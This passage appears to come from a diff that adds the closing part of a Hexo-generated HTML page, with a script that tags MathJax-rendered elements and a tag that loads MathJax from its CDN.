+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
